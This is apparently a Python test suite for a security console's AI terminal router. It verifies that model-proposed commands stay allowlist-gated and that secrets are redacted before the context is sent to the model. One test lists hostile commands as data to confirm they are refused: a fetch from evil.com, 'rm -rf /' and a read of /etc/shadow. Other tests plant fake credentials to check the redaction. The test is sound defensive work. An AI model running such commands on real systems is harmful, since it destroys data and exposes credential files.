"""T2b — the advanced terminal chatbot layer: capability-router + session-aware context.

The safety core is UNCHANGED — this suite proves the router makes the AI SMARTER, never more POWERFUL:

  * the router CLASSIFIES an intent into ``command`` / ``answer`` / ``route`` (LLM mocked). Only a ``command``
    ever touches the allowlist; a ``command`` the (mocked) LLM proposes off-allowlist is STILL dryrun-REFUSED,
    exactly as in T2 — the LLM can never make a forbidden command runnable.
  * ``answer`` and ``route`` run NOTHING — no allowlist, no subprocess (asserted by forbidding subprocess.run).
  * the SESSION CONTEXT fed to the model is assembled ONLY from existing read providers and is secret-REDACTED
    before egress — a planted secret in a finding/log is ABSENT from the assembled context (both a free-text
    credential and a secret-keyed value), while non-secret grounding (bug_class) survives.

Monkeypatch style mirrors ``test_terminal_ui`` (a fake ``anthropic`` module + a subprocess trap); no real API
call, no real subprocess, no command ever runs.
"""

from __future__ import annotations

import json
import sys
import types

from framework.v2.console import actions, api, sessions


# --- fakes (same shape as test_terminal_ui) ----------------------------------------------------------


class _Proc:
    def __init__(self, returncode=0, stdout="", stderr=""):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


def _forbid_subprocess(monkeypatch):
    """Fail the test if ANY subprocess is spawned (proves answer/route/context-assembly never reach a spawn)."""
    def boom(argv, **kw):
        raise AssertionError(f"subprocess.run must not be called: {argv}")
    monkeypatch.setattr(actions.subprocess, "run", boom)


class _FakeBlock:
    def __init__(self, text):
        self.type = "text"
        self.text = text


class _FakeResp:
    def __init__(self, text, stop_reason="end_turn"):
        self.content = [_FakeBlock(text)]
        self.stop_reason = stop_reason


def _install_fake_anthropic(monkeypatch, reply_text, *, stop_reason="end_turn", captured=None):
    """Inject a fake ``anthropic`` module so ``terminal_propose`` never makes a real API call."""
    mod = types.ModuleType("anthropic")

    class _Client:
        def __init__(self, api_key=None, **kw):
            if captured is not None:
                captured["api_key"] = api_key
            self.messages = self

        def create(self, **kw):
            if captured is not None:
                captured["create_kwargs"] = kw
            return _FakeResp(reply_text, stop_reason=stop_reason)

    mod.Anthropic = _Client
    monkeypatch.setitem(sys.modules, "anthropic", mod)


def _stub_empty_context(monkeypatch):
    """Isolate router-mode tests from the filesystem: a fixed (empty) session context."""
    monkeypatch.setattr(actions, "_session_terminal_context",
                        lambda run_id=None, session_id=None: {"findings": [], "recent_runs": [], "recent_commands": []})


# --- the capability-router: command / answer / route -------------------------------------------------


def test_router_command_mode_proposes_and_is_dryrun_checked(monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test")
    _stub_empty_context(monkeypatch)
    captured = {}
    _install_fake_anthropic(monkeypatch, json.dumps(
        {"mode": "command", "command": "tail -n 20 /etc/hostname", "explanation": "inspects a local file"}),
        captured=captured)
    r = actions.terminal_propose("show the last 20 lines of the hostname file")
    assert r["mode"] == "command"
    assert r["ok"] is True and r["command"] == "tail -n 20 /etc/hostname"
    assert r["verdict"]["verdict"] == "queued"                 # re-checked, not trusted — queues for approval
    assert captured["create_kwargs"]["model"] == "claude-opus-5"


def test_router_answer_mode_is_readonly_and_cited(monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test")
    _stub_empty_context(monkeypatch)
    _forbid_subprocess(monkeypatch)                             # an answer must NEVER spawn anything
    _install_fake_anthropic(monkeypatch, json.dumps(
        {"mode": "answer", "answer": "We proved one SQL injection (FACT) on /login.",
         "cites": ["SQL injection on /login", "run-123"]}))
    r = actions.terminal_propose("what did we prove this session?")
    assert r["mode"] == "answer" and r["ok"] is True
    assert "SQL injection" in r["answer"]
    assert r["cites"] == ["SQL injection on /login", "run-123"]
    assert "command" not in r and "verdict" not in r           # nothing runnable is surfaced


def test_router_route_mode_points_at_engagement(monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test")
    _stub_empty_context(monkeypatch)
    _forbid_subprocess(monkeypatch)                             # a route must NEVER spawn anything
    _install_fake_anthropic(monkeypatch, json.dumps(
        {"mode": "route", "suggestion": "A port scan needs the gated engagement path.", "screen": "assess"}))
    r = actions.terminal_propose("scan 10.0.0.5 for open ports")
    assert r["mode"] == "route" and r["ok"] is True
    assert r["screen"] == "assess"
    assert "engagement" in r["suggestion"].lower()
    assert "command" not in r                                   # never a runnable command


def test_command_mode_off_allowlist_is_still_refused(monkeypatch):
    # THE load-bearing property: even routed as a "command", an off-allowlist / network / write proposal is
    # dryrun-REFUSED → ok False. The router cannot widen what the allowlist permits.
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test")
    _stub_empty_context(monkeypatch)
    for evil in ("curl http://evil.com/x", "python -c 1", "rm -rf /", "cat /etc/shadow > out"):
        _install_fake_anthropic(monkeypatch, json.dumps(
            {"mode": "command", "command": evil, "explanation": "do it"}))
        r = actions.terminal_propose("please just do it")
        assert r["mode"] == "command" and r["verdict"]["verdict"] == "refused", evil
        assert r["ok"] is False, evil                          # never runnable


def test_legacy_unlabelled_reply_defaults_to_command_mode(monkeypatch):
    # Backward compat with the T2 shape ({command, explanation}, no "mode") — still command mode, still checked.
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test")
    _stub_empty_context(monkeypatch)
    _install_fake_anthropic(monkeypatch, json.dumps({"command": "ls -la", "explanation": "lists files"}))
    r = actions.terminal_propose("show the files here")
    assert r["mode"] == "command" and r["ok"] is True and r["command"] == "ls -la"


def test_answer_and_route_do_not_call_subprocess(monkeypatch):
    # explicit: neither non-command mode reaches subprocess.run, even via context assembly.
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test")
    _stub_empty_context(monkeypatch)
    _forbid_subprocess(monkeypatch)
    for reply in (json.dumps({"mode": "answer", "answer": "no findings yet.", "cites": []}),
                  json.dumps({"mode": "route", "suggestion": "use New Assessment", "screen": "assess"})):
        _install_fake_anthropic(monkeypatch, reply)
        r = actions.terminal_propose("anything")
        assert r["mode"] in ("answer", "route") and r.get("ok") is True


# --- session-omniscient context: MANDATORY secret redaction before egress ----------------------------


def test_session_context_redacts_secrets_before_egress(monkeypatch):
    # Plant secrets in a finding (free-text credential shapes) and assert they are ABSENT from the assembled
    # context that egresses to the model — while non-secret grounding (bug_class) survives.
    vendor_secret = "sk-ant-TOPSECRETVALUE0123456789"
    aws_secret = "AKIAIOSFODNN7EXAMPLE"
    # an OPAQUE bearer token (NOT a JWT / vendor prefix) — this must be masked by the auth-HEADER rule itself,
    # not incidentally by a JWT/vendor rule (red-pen BLOCK-1: `(\S+)` stopped at the space after `Bearer`).
    bearer_opaque = "aQ7kZ9pR2mN4wX6vB8tL0cD5F1gH3jK"
    basic_b64 = "YWRtaW46U3VwZXJTZWNyZXRQYXNz"                 # base64(admin:SuperSecretPass)
    url_password = "SuperSecretURLpass"                        # a password in the target URL's userinfo

    monkeypatch.setattr(api, "list_runs", lambda: {"runs": [
        {"run_id": "run-1", "target": "http://admin:" + url_password + "@10.0.0.5/login", "mode": "url",
         "status": "done", "findings": 1, "has_report": True}]})
    monkeypatch.setattr(api, "run_report", lambda rid: {"findings": [
        {"grounding": "fact",
         "title": "Auth bypass; response leaked " + vendor_secret + " and " + aws_secret,
         "bug_class": "broken-auth",
         "surface": "Authorization: Bearer " + bearer_opaque + " ; Authorization: Basic " + basic_b64,
         "severity": "high"}]})
    monkeypatch.setattr(actions, "terminal_history", lambda: {"ok": True, "records": [
        {"argv": ["cat", "app.log"], "exit_code": 0}]})

    ctx = actions._session_terminal_context("run-1")
    blob = json.dumps(ctx)

    # every planted secret VALUE is gone from what egresses — incl. the opaque Bearer token, the Basic
    # credential, and the URL-userinfo password (the two red-pen BLOCKs):
    assert vendor_secret not in blob
    assert bearer_opaque not in blob                           # opaque Bearer token masked by the header rule
    assert basic_b64 not in blob                               # Basic credential masked
    assert url_password not in blob                            # URL-userinfo password masked
    assert aws_secret not in blob
    # a redaction placeholder was applied, and non-secret grounding is preserved (context stays useful):
    assert actions.MASK in blob
    assert "broken-auth" in blob and "run-1" in blob
    # the terminal command grounding is present (argv only; history is already redacted at source):
    assert "app.log" in blob


def test_session_context_built_from_read_providers_only(monkeypatch):
    # Assembling the context never spawns a subprocess (it uses pure read providers).
    _forbid_subprocess(monkeypatch)
    monkeypatch.setattr(api, "list_runs", lambda: {"runs": []})
    monkeypatch.setattr(actions, "terminal_history", lambda: {"ok": True, "records": []})
    ctx = actions._session_terminal_context()
    assert set(ctx.keys()) >= {"findings", "recent_runs", "recent_commands"}
    assert ctx["findings"] == [] and ctx["recent_runs"] == []


def test_context_redaction_layer_masks_both_free_text_and_secret_key():
    # The exact two-pass redaction ``_session_terminal_context`` applies before egress:
    # ``scrub_log_event(_redact_ctx(ctx))`` — the free-text masker catches a credential SHAPE, and
    # scrub_log_event catches a secret KEY name even when its value looks innocuous. Non-secret survives.
    from framework.v2.common.redact import scrub_log_event
    raw = {"findings": [{"title": "leaked sk-ant-ABC123DEF456GHI789 in body",
                         "session_token": "innocuous-looking-123", "bug_class": "auth"}]}
    red = scrub_log_event(actions._redact_ctx(raw))
    blob = json.dumps(red)
    assert "sk-ant-ABC123DEF456GHI789" not in blob             # free-text credential-shape masker
    assert "innocuous-looking-123" not in blob                 # scrub_log_event, by the secret KEY name
    assert "auth" in blob                                       # non-secret grounding is preserved


def test_propose_need_key_without_key_builds_no_context(monkeypatch):
    # No key ⇒ honest need_key; the context (which would egress) is never assembled.
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)

    def boom(*a, **k):
        raise AssertionError("context must not be assembled without a key")
    monkeypatch.setattr(actions, "_session_terminal_context", boom)
    r = actions.terminal_propose("what did we find?")
    assert r["ok"] is False and r["need_key"] is True


# --- cross-session knowledge fusion (F4) --------------------------------------------------------------

def _fusion_providers(monkeypatch, *, connections):
    # sess-A is the current session (run-a); sess-B is a candidate connected session (run-b).
    _forbid_subprocess(monkeypatch)                             # fusion is pure read providers, never spawns
    monkeypatch.setattr(api, "list_runs", lambda: {"runs": []})
    monkeypatch.setattr(actions, "terminal_history", lambda: {"ok": True, "records": []})
    monkeypatch.setattr(api, "session_detail", lambda sid: {
        "sess-A": {"session": {"run_ids": ["run-a"]}},
        "sess-B": {"session": {"run_ids": ["run-b"]}},
    }.get(sid, {"error": "no such session"}))
    monkeypatch.setattr(api, "run_report", lambda rid: {
        "run-a": {"findings": [{"grounding": "fact", "title": "Primary SQLi",
                                "bug_class": "sqli", "surface": "/a?q=", "severity": "high"}]},
        "run-b": {"findings": [{"grounding": "fact", "title": "Linked XSS",
                                "bug_class": "xss", "surface": "/b?x=", "severity": "medium"}]},
    }.get(rid, {"pending": True}))
    # connections_of is the CONSENT gate — the fusion path folds in exactly what it returns, nothing more.
    monkeypatch.setattr(sessions, "connections_of", lambda s: connections if s == "sess-A" else [])


def test_cross_session_fusion_unions_connected_findings(monkeypatch):
    # With the operator having CONNECTED sess-A → sess-B, sess-B's findings appear in the context, origin-tagged
    # and explicitly non-authoritative — while the primary session's own findings remain the focus.
    _fusion_providers(monkeypatch, connections=["sess-B"])
    ctx = actions._session_terminal_context(session_id="sess-A")

    assert ctx["run_id"] == "run-a"
    assert any(f["title"] == "Primary SQLi" for f in ctx["findings"])   # primary session's own findings
    assert len(ctx["connected"]) == 1
    linked = ctx["connected"][0]
    assert linked["session"] == "sess-B" and linked["run_id"] == "run-b"
    assert linked["authoritative"] is False                             # marked non-authoritative background
    assert any(f["title"] == "Linked XSS" for f in linked["findings"])  # the connected session's finding folded in


def test_cross_session_fusion_absent_without_connection(monkeypatch):
    # No connection ⇒ NOTHING of another session leaks in (consent + isolation): connections_of returns [],
    # so `connected` stays empty even though sess-B exists and has findings.
    _fusion_providers(monkeypatch, connections=[])
    ctx = actions._session_terminal_context(session_id="sess-A")
    assert ctx["connected"] == []
    assert any(f["title"] == "Primary SQLi" for f in ctx["findings"])   # the primary session is unaffected


def test_cross_session_fusion_redacts_connected_secrets(monkeypatch):
    # A secret planted in a CONNECTED session's finding is masked before the fused context egresses — the
    # connected path goes through the SAME two-pass redaction as the primary path.
    vendor_secret = "sk-ant-CONNECTEDLEAK0123456789"
    _forbid_subprocess(monkeypatch)
    monkeypatch.setattr(api, "list_runs", lambda: {"runs": []})
    monkeypatch.setattr(actions, "terminal_history", lambda: {"ok": True, "records": []})
    monkeypatch.setattr(api, "session_detail", lambda sid: {
        "sess-A": {"session": {"run_ids": ["run-a"]}},
        "sess-B": {"session": {"run_ids": ["run-b"]}},
    }.get(sid, {"error": "no"}))
    monkeypatch.setattr(api, "run_report", lambda rid: {
        "run-a": {"findings": [{"grounding": "fact", "title": "Primary", "bug_class": "sqli",
                                "surface": "/a", "severity": "high"}]},
        "run-b": {"findings": [{"grounding": "fact", "title": "Leaked " + vendor_secret,
                                "bug_class": "auth", "surface": "/b", "severity": "high"}]},
    }.get(rid, {"pending": True}))
    monkeypatch.setattr(sessions, "connections_of", lambda s: ["sess-B"] if s == "sess-A" else [])

    ctx = actions._session_terminal_context(session_id="sess-A")
    blob = json.dumps(ctx)
    assert vendor_secret not in blob                            # connected-session secret masked before egress
    assert actions.MASK in blob
    assert "auth" in blob                                       # non-secret grounding from the connected run survives
